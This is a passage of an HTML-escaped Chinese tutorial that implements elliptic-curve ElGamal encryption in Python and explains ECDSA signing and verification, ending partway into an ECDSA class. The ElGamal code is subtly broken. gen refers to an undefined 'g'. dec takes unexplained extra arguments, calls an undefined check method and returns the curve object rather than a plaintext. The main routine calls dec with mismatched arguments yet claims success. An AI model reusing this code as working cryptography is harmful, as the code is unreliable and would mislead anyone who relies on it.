        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;Invalid order&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后我们实现ElGmamal算法 &lt;/p&gt;&lt;p&gt;构造函数生成曲线ec，生成元g，以及g的阶n&lt;/p&gt;&lt;ul&gt;&lt;li&gt;`gen(self, priv)`，生成公钥pub&lt;/li&gt;&lt;li&gt;`enc(self, plain, pub, r)`,把明文plain（已编码为曲线上的点）进行加密&lt;/li&gt;&lt;li&gt; `dec(self, cipher, priv)`，解密的明文&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ElGamal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ElGamal Encryption&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# pub key encryption as replacing (mulmod, powmod) to (ec.add, ec.mul)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# - ec: elliptic curve&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# - g: (random) a point on ec&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# generate pub key&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - priv: priv key as (random) int &amp;lt; ec.q&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - returns: pub key as points on ec&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
       
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# encrypt&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - plain: data as a point on ec&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - pub: pub key as points on ec&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - r: randam int &amp;lt; ec.q&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - returns: (cipher1, ciper2) as points on ec&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# decrypt&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - chiper: (chiper1, chiper2) as points on ec&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - priv: private key as int &amp;lt; ec.q&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - returns: plain as a point on ec&lt;/span&gt;
        
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后写个main函数验证一下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# shared elliptic curve system of examples&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# ElGamal enc/dec usage&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;eg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ElGamal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# mapping value to ec point&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# &amp;#34;masking&amp;#34;: value k to point ec.mul(g, k)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# (&amp;#34;imbedding&amp;#34; on proper n:use a point of x as 0 &amp;lt;= n*v &amp;lt;= x &amp;lt; n*(v+1) &amp;lt; q)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mapping&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decoded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decoded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;Success!&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-57ec04c1f56ae7372742efc52b95ec24_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;585&quot; data-rawheight=&quot;71&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;585&quot; data-original=&quot;https://pic1.zhimg.com/v2-57ec04c1f56ae7372742efc52b95ec24_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-57ec04c1f56ae7372742efc52b95ec24_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;585&quot; data-rawheight=&quot;71&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;585&quot; data-original=&quot;https://pic1.zhimg.com/v2-57ec04c1f56ae7372742efc52b95ec24_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-57ec04c1f56ae7372742efc52b95ec24_b.png&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;三、基于椭圆曲线的数字签名算法ECDSA&lt;/b&gt;&lt;/p&gt;&lt;p&gt;签名算法与上面的加密算法类似，下面我们来看一下过程：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;选择一条椭圆曲线Ep(a,b)，和基点G；&lt;/li&gt;&lt;li&gt;选择私有密钥k（k&amp;lt;n，n为G的阶），利用基点G计算公开密钥`Q=kG`；&lt;/li&gt;&lt;li&gt;产生一个随机整数r（r&amp;lt;n），计算点`R=rG`；&lt;/li&gt;&lt;li&gt;密文为message，计算SHA1(message)做为hash；&lt;/li&gt;&lt;li&gt;计算`S≡r^-1 *( Hash + k * R.x)(mod n)`; 这里的R.x为R的横坐标&lt;/li&gt;&lt;li&gt; (R.x, S)做为签名值，如果R和S其中一个为0，重新从第3步开始执行&lt;/li&gt;&lt;/ol&gt;&lt;blockquote&gt;注：这里的`r^-1`指的是r的乘法逆元&lt;/blockquote&gt;&lt;p&gt;验证签名：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;接收方在收到消息m和签名值(R.x, S)后，进行以下运算&lt;/li&gt;&lt;li&gt;计算明文hash：`hash = SHA1(m)`&lt;/li&gt;&lt;li&gt;计算P点：`P = S^-1 *(hash*G + R.x*Q)`&lt;/li&gt;&lt;li&gt;若P点的横坐标P.x == R.x,则说明校验成功。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;为什么会这样？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;下面我们来推导一下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;P = S^{-1} * (hash*G + R.x*Q) ·····1
Q = k*G	·····2
S = r^-1 *(hash + k*R.x)	·····3
R = r*G	·····4
联立1，2,得:
P = S^-1 * (hash + k*R.x)*G	·····5
这时候将3式带入5，即可得：
P = r*G    ·····6
这个时候我们对比4，6式，发现了这个神奇的结论：
P = R&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因此，在校验的时候比较P.x与R.x即可验证签名&lt;/p&gt;&lt;p&gt;我们已经完成数学上的推导，下面我们写个demo实现一下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;构造函数初始化椭圆曲线EC，生成元g，生成元的阶n&lt;/li&gt;&lt;li&gt;`gen(self, priv)`生成公钥Q&lt;/li&gt;&lt;li&gt;`sign(self, hashval, priv, r)`对hashval进行签名，返回签名(R.x, S)&lt;/li&gt;&lt;li&gt;`validate(self, hashval, sig, pub)`对签名进行验证，检验hashval是否被篡改&lt;/li&gt;&lt;/ul&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ECDSA&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# - ec: elliptic curve&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# - g: a point on ec&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;fm&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# generate pub key&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
